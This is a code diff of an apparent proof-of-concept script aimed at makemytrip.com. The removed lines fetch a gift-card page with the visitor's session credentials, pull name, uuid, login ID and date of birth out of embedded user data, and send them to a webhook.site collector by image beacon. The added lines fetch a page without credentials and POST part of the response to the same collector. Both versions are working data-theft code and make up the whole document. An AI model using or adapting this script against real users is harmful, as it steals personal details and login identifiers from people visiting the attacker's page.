@@ -1,32 +1,19 @@
 <script>
-fetch('https://www.makemytrip.com/gift-cards/corporate-gift-vouchers/', {
-  method: 'GET',
-  credentials: 'include'
+fetch("https://www.makemytrip.com/gift-cards/?popup=addgc", {
+  method: "GET",
+  mode: "cors" // no credentials
 })
-.then(r => r.text())
-.then(html => {
-  const userDataMatch = html.match(/window\\.__USER_DATA__=\\[(.*?)\\];/s);
-  if (!userDataMatch) throw "USER_DATA not found";
-
-  const jsonStr = "[" + userDataMatch[1] + "]";
-  const userData = JSON.parse(jsonStr)[0];
-
-  const pii = {
-    email: userData.userDetails.extendedUser.personalDetails.name,
-    uuid: userData.userDetails.extendedUser.uuid,
-    login: userData.userDetails.extendedUser.loginInfoList?.[0]?.loginId,
-    dob: userData.userDetails.extendedUser.personalDetails.dateOfBirth,
-    profileType: userData.profileType
-  };
-
-  const img = new Image();
-  img.src = 'https://webhook.site/de27185c-3af2-4bcd-8144-dee66cf296f8?' + 
-            new URLSearchParams(pii).toString();
-  document.body.appendChild(img);
+.then(res => res.text())
+.then(body => {
+  fetch("https://webhook.site/de27185c-3af2-4bcd-8144-dee66cf296f8", {
+    method: "POST",
+    headers: {
+      "Content-Type": "application/json"
+    },
+    body: JSON.stringify({
+      leak: body.slice(0, 1000)
+    })
+  });
 })
-.catch(err => {
-  const errImg = new Image();
-  errImg.src = 'https://webhook.site/de27185c-3af2-4bcd-8144-dee66cf296f8?error=' + encodeURIComponent(err);
-  document.body.appendChild(errImg);
-});
+.catch(err => console.error("PoC error:", err));
 </script>
